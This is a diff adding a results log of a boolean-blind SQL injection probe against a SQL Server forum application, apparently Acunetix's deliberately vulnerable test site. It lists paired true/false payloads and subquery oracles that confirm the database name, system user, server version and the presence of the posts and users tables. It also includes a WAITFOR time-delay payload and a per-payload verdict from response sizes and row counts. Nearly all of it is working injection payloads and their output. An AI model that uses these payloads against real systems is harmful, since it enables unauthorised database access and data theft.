@@ -1,0 +1,42 @@
+### 1. boolean-blind TRUE/FALSE 쌍 (rows>0 vs 0)
+LABEL            PAYLOAD                                                        CODE SIZE
+base_test        test                                                           200 2964
+true_1           zzq')>0 OR (1=1))--                                            200 7699
+false_1          zzq')>0 OR (1=2))--                                            200 3081
+true_2           zzq')>0 OR (2>1))--                                            200 7699
+false_2          zzq')>0 OR (2<1))--                                            200 3081
+true_alt         zzq')>0 OR ('a'='a'))--                                        200 7743
+false_alt        zzq')>0 OR ('a'='b'))--                                        200 3125
+
+### 2. 서브쿼리 오라클 (DB 사실 추출)
+db_name_t        zzq')>0 OR ((SELECT DB_NAME())='acuforum'))--                  200 7833
+db_name_f        zzq')>0 OR ((SELECT DB_NAME())='zzzzzz'))--                    200 3209
+sysuser_t        zzq')>0 OR ((SELECT SYSTEM_USER)='acunetix'))--                200 7823
+sysuser_f        zzq')>0 OR ((SELECT SYSTEM_USER)='sa'))--                      200 3187
+ver_like_t       zzq')>0 OR ((SELECT @@VERSION) LIKE '%SQL Server%'))--         200 7876
+posts_gt0        zzq')>0 OR ((SELECT COUNT(*) FROM posts)>0))--                 200 7832
+users_gt0        zzq')>0 OR ((SELECT COUNT(*) FROM users)>0))--                 200 7832
+admin_exists     zzq')>0 OR (EXISTS(SELECT 1 FROM users WHERE uname='admin'))-- 500 1208
+
+### 3. 시간 기반 오라클 (WAITFOR) — 보조 검증
+time_false       zzq')>0 OR (1=2))--                                            200 3081 elapsed=0.36s
+time_wait        zzq')>0)--; WAITFOR DELAY '0:0:4'--                            200 3157 elapsed=0.33s
+
+### 4. 판정 (rows = 렌더된 게시글 수)
+admin_exists       1179B rows=  0  verdict=no-rows
+base_test          2921B rows=  0  verdict=no-rows
+db_name_f          3166B rows=  0  verdict=no-rows
+db_name_t          7775B rows=  7  verdict=ROWS
+false_1            3038B rows=  0  verdict=no-rows
+false_2            3038B rows=  0  verdict=no-rows
+false_alt          3082B rows=  0  verdict=no-rows
+posts_gt0          7774B rows=  7  verdict=ROWS
+sysuser_f          3144B rows=  0  verdict=no-rows
+sysuser_t          7765B rows=  7  verdict=ROWS
+time_false         3038B rows=  0  verdict=no-rows
+time_wait          3114B rows=  0  verdict=no-rows
+true_1             7641B rows=  7  verdict=ROWS
+true_2             7641B rows=  7  verdict=ROWS
+true_alt           7685B rows=  7  verdict=ROWS
+users_gt0          7774B rows=  7  verdict=ROWS
+ver_like_t         7818B rows=  7  verdict=ROWS
